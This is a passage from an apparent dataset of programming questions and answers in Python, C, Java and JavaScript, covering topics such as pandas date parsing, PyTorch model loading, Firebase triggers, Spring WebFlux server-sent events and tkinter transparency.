# {'show_id': 's6067', 'type': 'TV Show', 'title': ""A Young Doctor's Notebook and Other Stories"", 'director': nan, 'cast': 'Daniel Radcliffe, Jon Hamm, Adam Godley, Christopher Godwin, Rosie Cavaliero, Vicki Pepperdine, Margaret Clunie, Tim Steed, Shaun Pye', 'country': 'United Kingdom', 'date_added': nan ...
# {'show_id': 's8756', 'type': 'TV Show', 'title': 'Women Behind Bars', 'director': nan, 'cast': nan, 'country': 'United States', 'date_added': ' November 1, 2016'...
...

How to fix:
df = pd.read_csv('netflix_titles.csv')
df['date_added'] = df['date_added'].fillna('January 1, 1970')           # default for nan. You can skip if you don't need all values ​​as datetime
df['date_added'] = df['date_added'].str.strip()                         # remove spaces
df['date_added'] = pd.to_datetime(df['date_added'], format='%B %d, %Y') # convert to dt

df.info()

Output:
<class 'pandas.core.frame.DataFrame'>
RangeIndex: 8807 entries, 0 to 8806
Data columns (total 12 columns):
 #   Column        Non-Null Count  Dtype         
---  ------        --------------  -----         
 0   show_id       8807 non-null   object        
 1   type          8807 non-null   object        
 2   title         8807 non-null   object        
 3   director      6173 non-null   object        
 4   cast          7982 non-null   object        
 5   country       7976 non-null   object        
 6   date_added    8807 non-null   datetime64[ns]
 7   release_year  8807 non-null   int64         
 8   rating        8803 non-null   object        
 9   duration      8804 non-null   object        
 10  listed_in     8807 non-null   object        
 11  description   8807 non-null   object        
dtypes: datetime64[ns](1), int64(1), object(10)
memory usage: 825.8+ KB

",python
how can i programmatically find the cpu frequency with c,"I'm trying to find out if there is any way to get an idea of the CPU frequency of the system my C code is running on.
To clarify, I'm looking for an abstract solution (one that will not be tied to a specific architecture or operating system), which can give me an idea of the operating frequency of the computer that my code is executing on. I don't need to be exact, but I'd like to be in the ball park (i.e., I have a 2.2 GHz processor, and I'd like to be able to tell in my program that I'm within a few hundred MHz of that).
How can I use standard C code?
","How you find the CPU frequency is both architecture and OS dependent, and there is no abstract solution.
If we were 20+ years ago and you were using an OS without any context switching and the CPU executed the instructions given it in order, you could write some C code in a loop and time it, and then, based on the assembly it was compiled into, compute the number of instructions at runtime. This is already making the assumption that each instruction takes 1 clock cycle, which is a rather poor assumption ever since pipelined processors.
But any modern OS will switch between multiple processes. Even then you can attempt to time a bunch of identical for loop runs (ignoring time needed for page faults and multiple other reasons why your processor might stall) and get a median value.
And even if the previous solution works, you have multi-issue processors. With any modern processor, it's fair game to reorder your instructions, issue a bunch of them in the same clock cycle, or even split them across cores.
",c
what exactly are the quottasksquot displayed in the top command output and where to find them,"So i am currently working on my own implementation of the top command using the ncurses and the Ubuntu system files and I have been wondering what exactly are the tasks it shows.
I did understand that they are the processes running on the device but i am looking for the Ubuntu folder where i can see this total numbers of tasks or the different tasks running.
","Basically the folder you are looking is: /proc, and it's helpful to read this site.
When you browsing man page of top, it's recommend to check the ""See also"" and check the gitlab repository of procps, the source code of top resides in it.
At the line 5808 in file src/top/top.c, you can see an action to open the file under /proc, maybe you could check that for more detail.
",c
how transfer float number due to http get request,"Could you help me with my issue? I have a back-end on Java Spring Boot and I need to use GET request to transfer for example ""2300,55"". As I understand the GET only can transfer Strings and with Long numbers where was no problems yet, but I need to transfer number with comma or with point. How to do this?
I tried to parse it, getting String and parse in try/catch block:
...
    @PathVariable(""weight"") String weight
    try {
        float parsedWeight = Float.parseFloat(weight);
    } catch (NumberFormatException e) {
...

And catched 

java.lang.NumberFormatException: For input string: ""2300,55""

But if I try it with point in stead of comma  ""2300.55"" it's persisted OK into database, but it's became just ""2300"". Database PostgreSQL and column type is REAL -> that is float4 (a single-precision floating-point number (4 bytes))
","
And catched java.lang.NumberFormatException: For input string: ""2300,55""

The issues like having decimal comma instead of point are related to localization. If remote sends numbers like 2300,55, this means it sends numbers in localized form. Generally, this is treated as Extremely Bad in network interaction: all data shall be sent between programs in the only defined locale-neutral form. Localized forms shall be used only in interaction with humans. So, the suggested way is to fix the remote side that it sent only neutral representations.
But, if you have no influence onto remote side and have to deal with broken forms, try Java Scanner class methods with setting an expected locale or LocalDecimalSeparator separately. For a decimal comma, this is likely some European locale.
(I cannot answer for DB issue. But, locale issues should have the same principal form there.)
",java
firebase cloud function  null userdisplayname oncreate,"I'm trying to write a function that will send a welcome email on user creation. I followed along to this tutorial, which says that one can access the newly created user's displayName with user.displayName, though it keeps returning null for me. I realized that the probable reason that this happens (correct me if I'm wrong here) is that registration and setting the user's displayName happens in two separate steps client-side and therefore when onCreate is triggered, user.displayName will naturally be null. Here's my client-side code, for reference:
fb.auth().createUserWithEmailAndPassword(payload.email, payload.password).then(user => {
  return user.user.updateProfile({ displayName: payload.name, });
}).catch(/* ... */);

What I'm looking for is a cloud function that gets triggered on user.updateProfile. I've looked into the auth.user().onOperation function (found here), but when I try to deploy this function to firebase, I get the error Error: Functions did not deploy properly. (helpful, ikr), which I guess has something to do with the onOperation function being private (correct me if I'm wrong).
Is there any way to do what I'm trying to do? If so, how? Alternatively, is there a way to set the displayName on createUserWithEmailAndPassword, so that I can keep using the onCreate function?
Here's my current onCreate code:
exports.sendWelcomeEmail = functions.auth.user().onCreate(user => {
  console.log('name:', user.displayName);
});

And here's my attempt at the onOperation function:
exports.sendWelcomeEmail = functions.auth.user().onOperation(user => {
  console.log('user:', user);
}, 'updateProfile');

","If I where you, I wouldnt use firebase auth for user's profile. Maybe is a better idea to use a collection of users, where you have access to update triggers. 
Normally, what I do is to have a trigger when there is new auth user, create a user in the userscollection. With this design you could have a trigger everytime someone updates it's profile. 
exports.onCreateAuthUser = functions.auth.user().onCreate(user => {
  firestore.collection('users').doc(user.uid).set({
     displayName: user.displayName,
     email: user.email,
     // any other properties 
  })

  //do other stuff
});

exports.onUpdateUser = functions
  .firestore.document('users/{id}')
  .onUpdate((change, context) => {
     // do stuff when user's profile gets updated
}

Hope that helps :)
",javascript
using queryselector to find descendant elements returns unexpected results,"So I've been playing around with querySelector recently and noticed some really odd behaviour when trying to select descendant elements. 
Take the following markup as an example:
<div id=""parent"">
  <div id=""foo"">
    <div id=""bar""></div>
  </div>
</div>

If I want to query this DOM tree from the context of the #parent element, I may do the following:
var parent = document.getElementById('parent');
parent.querySelector('div')

This returns the #foo element as expected. Now, if I wanted to get the #bar element by only referencing tag names, I could do either of these:
var parent = document.getElementById('parent');
parent.querySelector('div div')
parent.querySelector('div > div')

Instead, both selector strings return the #foo element, not the #bar element? However, changing the contextual element (#parent) to a span fixes the issue? It seems as if the contextual element influences how it interprets the selector string. Alternatively, jQuery's selector engine performs as expected. 
I created a CodePen that illustrated the problem.
I don't think this is a bug because the results are consistent in multiple browsers (I'm using Chrome 37). I suppose my question is; am I missing something? Is this part of the spec? Does anyone have an explanation for this behaviour?
Any insight would be appreciated, thanks,
Ryan
","Per the docs, ""Selectors are evaluated against a given element in the context of the entire DOM tree in which the element is located.""
That is, it's not a jQuery-style ""find an element matching the selector path starting here"".
#parent #foo definitely matches div div and div > div, when viewed from the DOM tree level, per the spec.
It ""works"" when you change #parent to a span because #parent #foo no longer matches div div, and #foo #bar is the new first match.
",javascript
test cases in c for wifsignaled wifstopped wifcontinued,"I'm playing with waitpid() and signal() and I'm looking for reliable test cases for returning WIFSIGNALED(status) = WIFSTOPPED(status) = WIFCONTINUED (status) = true but can't find any...
Care to tell me how can I make sure those return true so I can debug my code?
Also, a few hints about what signals should I catch with signal() to test those macros would be helpful...
","#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

#define NELEMS(x) (sizeof (x) / sizeof (x)[0])

static void testsignaled(void) {
   kill(getpid(), SIGINT);
}

static void teststopped(void) {
   kill(getpid(), SIGSTOP);
}

static void testcontinued(void) {
   kill(getpid(), SIGSTOP);
   /* Busy-work to keep us from exiting before the parent waits.
    * This is a race.
    */
   alarm(1);
   while(1) {}
}

int main(void) {
   void (*test[])(void) = {testsignaled, teststopped, testcontinued};
   pid_t pid[NELEMS(test)];
   int i, status;
   for(i = 0; i < sizeof test / sizeof test[0]; ++i) {
      pid[i] = fork();
      if(0 == pid[i]) {
         test[i]();
         return 0;
      }
   }
   /* Pause to let the child processes to do their thing.
    * This is a race.
    */
   sleep(1);
   /* Observe the stoppage of the third process and continue it. */
   wait4(pid[2], &status, WUNTRACED, 0);
   kill(pid[2], SIGCONT);
   /* Wait for the child processes. */
   for(i = 0; i < NELEMS(test); ++i) {
      wait4(pid[i], &status, WCONTINUED | WUNTRACED, 0);
      printf(""%d%s%s%s\n"", i, WIFCONTINUED(status) ? "" CONTINUED"" : """", WIFSIGNALED(status) ? "" SIGNALED"" : """", WIFSTOPPED(status) ? "" STOPPED"" : """");
   }
   return 0;
}

",c
pytestwarning module already imported so cannot be rewritten pytest_remotedata,"I created some unit tests and run them from the same file.  For tests in the same file:
if __name__ == ""__main__"":
    import pytest
    pytest.main(['--tb=short', __file__])

For tests in another file:
if __name__ == '__main__':
    import pytest
    pytest.main(['./test_stuff.py', ""--capture=sys""])

In either case, when I execute the file the first time, it works fine, but the second and subsequent times it gives a bunch of warnings:
============================== warnings summary ===============================
C:\Anaconda3\lib\site-packages\_pytest\config\__init__.py:754
  C:\Anaconda3\lib\site-packages\_pytest\config\__init__.py:754: PytestWarning: Module already imported so cannot be rewritten: pytest_remotedata
    self._mark_plugins_for_rewrite(hook)
  C:\Anaconda3\lib\site-packages\_pytest\config\__init__.py:754: PytestWarning: Module already imported so cannot be rewritten: pytest_openfiles
    self._mark_plugins_for_rewrite(hook)
  C:\Anaconda3\lib\site-packages\_pytest\config\__init__.py:754: PytestWarning: Module already imported so cannot be rewritten: pytest_doctestplus
    self._mark_plugins_for_rewrite(hook)
  C:\Anaconda3\lib\site-packages\_pytest\config\__init__.py:754: PytestWarning: Module already imported so cannot be rewritten: pytest_arraydiff
    self._mark_plugins_for_rewrite(hook)

-- Docs: https://docs.pytest.org/en/latest/warnings.html
==================== 1 passed, 4 warnings in 0.06 seconds 

Is there any way to make these warnings go away?
Restarting the kernel works, but IPython's %reset and %clear aren't enough to fix it, either.
","Use subprocess instead of pytest.main:
if __name__ == ""__main__"":
    import subprocess
    subprocess.call(['pytest', '--tb=short', str(__file__)])

If the above does not print anything, try the workaround (as suggested in comments):
if __name__ == ""__main__"":
    from subprocess import Popen, PIPE
    with Popen(['pytest',
                '--tb=short',  # shorter traceback format
                str(__file__)], stdout=PIPE, bufsize=1,
                universal_newlines=True) as p:
        for line in p.stdout:
            print(line, end='')

",python
queryselector child to parent,"Nowadays I am working on an application. I been struggling for a while how I should select a parent of a child.
What I trying to do is
Click on child(card) and do something with a parent(cell).
Is there a way how I could querySelector the parent e.g.
const selectedParentFromChild = document.querySelector("".child .parent"")
Solution:

For those which were struggled as well. You can use parentElement like @Phix has mentioned down below in the comments.
","try this:
let child = document.querySelector("".child"");
let parent = child.parentNode;

and you can't get the parent of a child via css only, there is currently no such selector see here
",javascript
typeerror 39_incompatiblekeys39 object is not callable,"I am training a CNN for a multilabel classification problem and have saved my .pt model with torch.save(model.state_dict(), ""model.pt"") . For some reason when I test the model with a custom function predict(x) that takes an array of images as input, I get the following error: TypeError: '_IncompatibleKeys' object is not callable. It points out to the last chunk of the cade below: y_test_pred = model(images_tensors). Any idea on what could be the issue here? 
import numpy as np
import cv2
import torch
from torch import nn
import torch.nn.functional as F
import os


class Net(nn.Module):
    def __init__(self, classes_number):
        super().__init__()
        self.ConvLayer1 = nn.Sequential(
            nn.Conv2d(1, 8, 5),  # inp (1, 512, 512)
            nn.MaxPool2d(2),
            nn.ReLU()  # op (8, 254, 254)
        )
        self.ConvLayer2 = nn.Sequential(
            nn.Conv2d(8, 16, 3),  # inp (8, 254, 254)
            nn.MaxPool2d(2),
            nn.ReLU(),
            nn.BatchNorm2d(16)  # op (16, 126, 126)
        )
        self.ConvLayer3 = nn.Sequential(
            nn.Conv2d(16, 32, 3),  # inp (16, 126, 126)
            nn.MaxPool2d(2),
            nn.ReLU(),
            nn.BatchNorm2d(32)  # op (32, 62, 62)
        )
        self.ConvLayer4 = nn.Sequential(
            nn.Conv2d(32, 64, 3),  # inp (32, 62, 62)
            nn.MaxPool2d(2),
            nn.ReLU()  # op (64, 30, 30)
        )
        self.Lin1 = nn.Linear(30 * 30 * 64, 1500)
        self.drop = nn.Dropout(0.5)
        self.Lin2 = nn.Linear(1500, 150)
        self.drop = nn.Dropout(0.3)
        self.Lin3 = nn.Linear(150, classes_number)

    def forward(self, x):
        x = self.ConvLayer1(x)
        x = self.ConvLayer2(x)
        x = self.ConvLayer3(x)
        x = self.ConvLayer4(x)
        x = x.view(x.size(0), -1)
        x = F.relu(self.Lin1(x))
        x = self.drop(x)
        x = F.relu(self.Lin2(x))
        x = self.drop(x)
        x = self.Lin3(x)
        out = torch.sigmoid(x)
        return out


def predict(x):
    # On the exam, x will be a list of all the paths to the images of our held-out set
    images = []
    for img_path in x:
        img = cv2.imread(img_path)
        img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)  # Turn into greyscale
        img = cv2.resize(img, (512, 512))
        images.append(img)
    images = np.array(images)
    images = images.reshape(len(images), 1, images.shape[1], images.shape[1])  # converting(n,512,512)>(n,1,512,512)
    images_tensors = torch.FloatTensor(np.array(images))
    images_tensors = images_tensors.to(device)
    classes = [""red blood cell"", ""difficult"", ""gametocyte"", ""trophozoite"", ""ring"", ""schizont"", ""leukocyte""]
    model = Net(len(classes))
    model = model.load_state_dict(torch.load('model.pt'))


    y_test_pred = model(images_tensors)
    y_test_pred[y_test_pred > 0.49] = 1
    y_test_pred[y_test_pred < 0.5] = 0

    return y_test_pred.cpu().detach()

","The buggy line is model = model.load_state_dict(torch.load('model.pt')). According to the docs, load_state_dict returns a NamedTuple with missing_keys and unexpected_keys fields, not a model object. In your code you assign this named tuple to the model variable, so then when you call model in the next line you are actually trying to call the NamedTuple, which gives you the TypeError.
Instead, according to the saving and loading modules docs, you should do something like this:
model = Net(len(classes))
model.load_state_dict(torch.load(PATH))
model.eval()

",python
trying to convert utc time with specific time zones,"I am currently creating an app through React which connects to the OpenWeatherAPI. The app is when someone types in there location it pulls the weather of their specific location. The issue I am having is converting the timestamp of the specific location to a local time. I have used MomentJs, but the time keeps up coming wrong. The issue for example if someone chooses Tokyo, Japan I want it to show that the sunrise will be 6:50 am their local time. Right now I am getting back Mon Dec 28 2020 16:50:24 GMT-0500 (Eastern Standard Time).
This is the API snippet:
{
  ""dt"": 1609176171,
    ""sys"": {
        ""type"": 1,
        ""id"": 8074,
        ""country"": ""JP"",
        ""sunrise"": 1609192224,
        ""sunset"": 1609227369
    },
    ""timezone"": 32400,
    ""id"": 1862143,
    ""name"": ""Horinouchi"",
    ""cod"": 200
}


","You can create a date for the sunrise by adding the timezone value.
The example below will produce a date and time in the timezone of the weather record (Horinouchi), NOT the timezone of the user.


const data = {
  ""dt"": 1609176171,
  ""sys"": {
    ""type"": 1,
    ""id"": 8074,
    ""country"": ""JP"",
    ""sunrise"": 1609192224,
    ""sunset"": 1609227369
  },
  ""timezone"": 32400,
  ""id"": 1862143,
  ""name"": ""Horinouchi"",
  ""cod"": 200
};

// extract sunrise and timezone offset in UNIX epoch seconds
const {
  sys: {sunrise},
  timezone
} = data;

// create Date object for sunrise with timezone offset
const srTime = new Date((sunrise+timezone)*1000);

// convert number to a 2-digit string
const twoDigits = (val) => {
  return ('0' + val).slice(-2);
};

const year = srTime.getUTCFullYear();
const month = twoDigits(srTime.getUTCMonth()+1);
const dayOfMonth = twoDigits(srTime.getUTCDate());
const hours = twoDigits(srTime.getUTCHours());
const minutes = twoDigits(srTime.getUTCMinutes());
const seconds = twoDigits(srTime.getUTCSeconds());

console.log(`${year}-${month}-${dayOfMonth} ${hours}:${minutes}:${seconds}`);



Note that the date will be in UTC time, so be sure to display it for the user that way (i.e. don't display it with a local offset).
To display the UTC date, use Date.prototype:

.getUTCDate()
.getUTCMonth()
.getUTCDay()
.getUTCHours()
.getUTCMinutes()
.getUCSeconds()

",javascript
stream equivalent of summing values within nested foreach loops with a filter,"How can a sum be calculated using the Stream API with nested foreach loops where each has a filter condition?
//java7
Double sum = null; 
for (FirstNode first : response.getFirstNodes()) {
    if (first.isValid()) {
        for (SndNnode snd : first.getSndNodes()) {
            if (snd.getType() == NodeType.AMOUNT) {
                sum += snd.getAmount();
                break;
            }
        }
    }
}

//java8
response.getFirstNodes().stream().filter(first -> first.isValid()).mapToDouble(???).sum();

My snd foreach loop would be:
first.getSndNodes().stream().filter(snd -> snd.getType() == NodeType.AMOUNT).mapToDouble(snd -> snd.getAmount()).findFirst().sum();

How could I now integrate the snd foreach loop into the first, to get a global sum of the nested lists?
","You could use flatMap:
response.getFirstNodes()
        .stream()
        .filter(first -> first.isValid())
        .flatMap(first -> first.getSndNodes().stream())
        .filter(snd -> snd.getType() == NodeType.AMOUNT)
        .mapToDouble(snd -> snd.getAmount())
        .sum();

I'm not sure whether that break; is intentional in your original code.

With the break; statement, it should looks like this:
response.getFirstNodes()
                .stream()
                .filter(first -> first.isValid())
                .map(first -> first.getSndNodes().stream().filter(snd -> snd.getType() == NodeType.AMOUNT).findFirst())
                .filter(Optional::isPresent)
                .mapToDouble(opt -> opt.get().getAmount())
                .sum();

Basically, for each FirstNode you test whether it's valid, then you map each FirstNode to a stream of its SndNodes for which you find the first that has the type NodeType.AMOUNT. You need then to filter to get only Optionals that are not empty and for them you get the SndNode they contains for which you get the corresponding amount.
",java
tkinter different behaviours for alpha using terminal and script,"I'm trying to create an interface that has some transparency. I know that should be straightforward, but I'm facing a confusing bug.
If I run the following code in the terminal:
import tkinter as tk
root = tk.Tk()
root.geometry(""400x400"")
root.attributes(""-alpha"", 0.5)
root.mainloop()

It works fine, and the window is created perfectly with the dimensions and transparency I requested. However, if I run a script like this (on the same environment):
import tkinter as tk

if __name__ == ""__main__"":
    root = tk.Tk()
    root.geometry(""400x400"")
    root.attributes(""-alpha"", 0.5)
    root.mainloop()

It doesn't work. The dimensions are applied to the new window, but not the transparency.
I tried wm_attributes and attributes. Both do not work when running python script.py.
Am I crazy? Why is there any difference in behaviour?
The environments are the same; I'm using Python 3.13, and no other dependencies are involved. I'm using Ubuntu 22.04 using x11.

Edit:
Here is proof I'm running on the same environment.

And just so the terminal is clear folder git status environment laptop battery
","So, thanks to the comments, I managed to find an answer. When setting attributes like -alpha, some window managers delay applying them until the window is fully realized and shown. By adding root.update_idletasks() before root.attributes(""-alpha"", 0.5) my script now behaves like the terminal.
The updated code is now:
import tkinter as tk

if __name__ == ""__main__"":
    root = tk.Tk()
    root.geometry(""400x400"")
    root.update_idletasks()
    root.attributes(""-alpha"", 0.5)
    root.mainloop()

Thanks for the help! I am leaving the answer here in case someone faces the same issue in the future.

Given @TheLizzard comments, I think a better solution would be:
import tkinter as tk

if __name__ == ""__main__"":
    root = tk.Tk()
    root.geometry(""400x400"")
    root.after_idle(root.attributes, ""-alpha"", 0.5)
    root.mainloop()

So, it waits for the window to be idle.
",python
how to i make a radio button which switches background color in bootstrap and js,"
I'd like to make a idea note like bulletin board to use bootstrap and Javascript. So I make a input-group include send button, enter or click message add like a stack. But I don't know how to use when onclick two function which is setting background-color and send message at the same time. In radio button, when I check the button, Can I change the color code in bootstrap?
The radio button which switch card-header's background color Pink or Gray can change card-header's color when I checked color and enter the message. Depending on the checked radio button, the color of the header part where the message was pressed must be changed.


function addMessage() {
  const input = document.getElementById('messageInput');
  const messageText = input.value.trim();
  if (messageText !== '') {
    const messageHTML = `
<div class=""card mb-3 shadow-sm"">
  <div class=""card-header bg-primary"">
    <div class=""text-muted"">
      Posted by ${getCurrentUser()} at ${formatDateTime()}
    </div>
  </div>
  <div class=""card-body"">
    <div class=""d-flex justify-content-between align-items-top"">
      <div class=""flex-grow-1"">
        <div class=""message-text"">${messageText}</div>
      </div>
      <button class=""btn btn-danger btn-sm ms-2"" onclick=""this.closest('.card').remove()"">Delete</button>
    </div>
  </div>
</div>`;

  }
}
<!-- Input group -->
<div class=""d-flex justify-content mb-5"">
  <div class=""input-group"">
    <input type=""text"" class=""form-control"" id=""messageInput"" placeholder=""Text input"">
    <button type=""button"" class=""btn btn-primary"" onclick='addMessage()'>Send</button>
  </div>
</div>

<div class=""message-board"" id=""messageBoard""></div>



","I would delegate


window.addEventListener('load', () => { // when page has loaded
  const input = document.getElementById('messageInput');
  const messageBoard = document.getElementById('messageBoard');

  const getCurrentUser = () => {
    return ""User""; // Replace with your logic to fetch the current user
  };

  const formatDateTime = () => {
    const now = new Date();
    return `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;
  };

  const addMessage = () => {
    const messageText = input.value.trim();

    // Get selected color
    const selectedColor = document.querySelector('input[name=""headerColor""]:checked').value;

    if (messageText !== '') {
      const messageHTML = `
<div class=""card mb-3 shadow-sm"">
  <div class=""card-header ${selectedColor}"">
    <div class=""text-muted"">
      Posted by ${getCurrentUser()} at ${formatDateTime()}
    </div>
  </div>
  <div class=""card-body"">
    <div class=""d-flex justify-content-between align-items-top"">
      <div class=""flex-grow-1"">
        <div class=""message-text"">${messageText}</div>
      </div>
      <button class=""btn btn-danger btn-sm ms-2 delete"">Delete</button>
    </div>
  </div>
</div>`;
      messageBoard.insertAdjacentHTML('beforeend', messageHTML);
      input.value = ''; // Clear the input
    } else {
      alert('Please enter a message!');
    }
    input.focus();
    input.select();
  }
  messageBoard.addEventListener('click', (e) => {
    const tgt = e.target.closest('button.delete');
    if (!tgt) return;
    tgt.closest('.card').remove()
  })
  
  document.getElementById('send').addEventListener('click', addMessage);
  input.focus();
  input.select();
});
<link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"" rel=""stylesheet"" />

<!-- Color Selection Radio Buttons -->
<div class=""mb-3"">
  <label class=""form-label"">Choose Header Color:</label>
  <div>
    <input type=""radio"" id=""pink"" name=""headerColor"" value=""bg-danger"" checked>
    <label for=""pink"">Pink</label>
    <input type=""radio"" id=""gray"" name=""headerColor"" value=""bg-secondary"">
    <label for=""gray"">Gray</label>
  </div>
</div>

<!-- Input group -->
<div class=""d-flex justify-content mb-5"">
  <div class=""input-group"">
    <input type=""text"" class=""form-control"" id=""messageInput"" placeholder=""Text input"">
    <button id=""send"" type=""button"" class=""btn btn-primary"">Send</button>
  </div>
</div>

<!-- Message Board -->
<div class=""message-board"" id=""messageBoard""></div>



",javascript
why is my angular app not receiving serversent events sse from a webflux backend,"I am building an application with a Spring WebFlux backend and an Angular frontend. My backend sends Server-Sent Events (SSE), but for some reason, the Angular app is not receiving these events, even though the same backend works perfectly when tested in Postman or with curl.
Here’s what I’ve implemented so far:
Backend (WebFlux):
The WebFlux controller sends SSE using MediaType.TEXT_EVENT_STREAM_VALUE:
  @GetMapping(value = ""/purchasedItems"",produces = MediaType.TEXT_EVENT_STREAM_VALUE)
    @ResponseStatus(HttpStatus.ACCEPTED)
    public Flux<PurchasedItemData> findAllPurchasedItem(ServerHttpResponse response){

        response.getHeaders().add(""Cache-Control"", ""no-cache, no-transform"");
        response.getHeaders().add(""Connection"", ""keep-alive"");

        return purchaseService.getPurchasedItems()
                .doOnNext(item -> System.out.println(""Sending item: "" + item.getName()))
                .doOnError(error -> System.out.println(""Error sending items: ""+  error.getMessage()))
                .doFinally(signalType -> System.out.println(""Streaming finished: "" + signalType));
       
    }
    }
}


When I test this endpoint with curl or Postman, I see the events streaming correctly.
Frontend (Angular):
I’m using the native EventSource API to consume SSE:
private apiUrl = 'http://localhost:8080/paypro/purchasedItems';
fetchPurchasedItems(): Observable<any> {
    return new Observable(observer => {
      const eventSource = new EventSource(this.apiUrl);

      eventSource.onmessage = (event) => {
        try {
          debugger;
          const data = JSON.parse(event.data);
          console.log('Received SSE data:', data); // Debugging line
          observer.next(data);
        } catch (error) {
          console.error('Error parsing SSE data:', event.data, error);

          observer.error(error);
        }
      };

      eventSource.addEventListener('message', (evt) => {
        console.log('Received SSE data:', evt.data); // Debugging line
        observer.next(evt);
      });


      eventSource.onerror = (error) => {
        console.error('EventSource error:', error);
        debugger;
        observer.error(error);
        eventSource.close();
      };

      return () => eventSource.close();
    });
  }

In my Angular component:
  public loadData() {
    // this.purchasedItems$ = this.service.fetchPurchasedItems();
    this.isLoading = true;
    this.service.fetchPurchasedItems().subscribe({
      next: (data) => {
        console.log('Fetched data:', data);
        debugger;
        this.purchasedItems=[...this.purchasedItems,...data];
        this.cd.detectChanges(); // Trigger change detection
      },

      error: (err) => {
        console.error('Error fetching data', err);
        this.isLoading = false;
      }
    });
    
  }


Proxy Configuration:
In development, I’m using a proxy configuration to redirect /api/events to http://localhost:8080/events:
proxy.conf.json:
{
  ""/paypro/*"": {
    ""target"": ""http://localhost:8080"",
    ""secure"": false,
    ""logLevel"": ""debug"",
    ""changeOrigin"": true
  }
}


Problem:
1.In the Angular app, the EventSource immediately triggers the onerror event with no data received.
2.The browser's Network tab shows the request to /api/events is made, but the connection closes immediately without any SSE data.
3.There are no errors in the backend logs.
What I’ve Tried:
1.Testing the /events endpoint with curl and Postman—works perfectly.

2.Ensuring the response header includes Content-Type: text/event-stream.
3.Double-checking the proxy configuration in Angular.
4.Adding CORS settings to the WebFlux backend:
java
@Bean
public CorsWebFilter corsWebFilter() {
    CorsConfiguration config = new CorsConfiguration();
    config.addAllowedOrigin(""http://localhost:4200"");
    config.addAllowedMethod(""*"");
    config.addAllowedHeader(""*"");
    config.setAllowCredentials(true);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration(""/**"", config);

    return new CorsWebFilter(source);
}


What could be causing the Angular app to fail when consuming SSE from the WebFlux backend, and how can I fix this issue?
Any help would be greatly appreciated!
","I found the issue, and I want to share the solution for future visitors to this thread.
The problem was caused by the use of the annotation:
@ResponseStatus(HttpStatus.ACCEPTED)

This annotation was redundant in my case. It likely caused the connection to be closed prematurely, preventing the application from functioning correctly.
Solution:
After removing the @ResponseStatus(HttpStatus.ACCEPTED), the application started working as expected. If you're facing a similar issue, consider whether this annotation is necessary for your use case, as it might interfere with response handling.
",java
why do i get undefined in my javascript array output instead of the correct number,"const users = { user1: 18273, user2: 92833, user3: 90315 }

Answer:
const usersArray = Object.entries(users).map((keys, value)=> {return keys[0] + ' ' + value[1]});
console.log(usersArray);

OUTPUT:
 ['user1 undefined', 'user2 undefined', 'user3 undefined']

I expect the output to be like this:
 [ [ 'user1', 18273 ], [ 'user2', 92833 ], [ 'user3', 90315 ] ]

","this should work

const users = { user1: 18273, user2: 92833, user3: 90315 }
const usersArray = Object.entries(users).map((user) => ([user[0], user[1]]));
console.log(usersArray);


",javascript
unable to validate a form using javascript php redirect issues,"I've coded a simple form for a friend's hobby; basically, we are trying to guess the starting lineup for a couple of teams in the 2010 FIFAWorld Cup (just for the kicks).
Anyway, I need to validate the following form. All the Javascript functions appear to function well because if i just call them outside of the  tag, everything works fine. Now, i want to perform some basic client-side validation (i know, it isn't safe blabla but it's a hobby, so it isn't relevant) and then pass the form to another page where a PHP (currently using WAMP Server 2.0) script will collect the data and store it in the database.
Here's the form:
<form name =""formPT"" id=""formPT"" action="""" onsubmit=""return ValidaTudo();"" method=""post"">
<a><img src=""icons/paises/portugal-flag-icon.png"" alt=""portugal"" border=""0"" style=""vertical-align:middle""> Portugal</a>
<table id=""tabela_PT"" cellspacing=""0"" summary=""Equipa"">
<thead>
<tr>
<th scope=""col"" abbr=""Nome"" class=""nobg"">Nome</th>
<th scope=""col"" abbr=""Posicao"">Posição</th>
<th scope=""col"" abbr=""Escolha"">Escolha</th>
<th scope=""col"" abbr=""Anterior"">Escolha Anterior</th>
</tr>
</thead>
<tbody>
<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Eduardo</td><td>Guarda-redes</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Beto</td><td>Guarda-redes</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Daniel Fernandes</td><td>Guarda-redes</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Paulo Ferreira</td><td>Defesa</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Miguel</td><td>Defesa</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Ricardo Carvalho</td><td>Defesa</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Bruno Alves</td><td>Defesa</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Ricardo Costa</td><td>Defesa</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
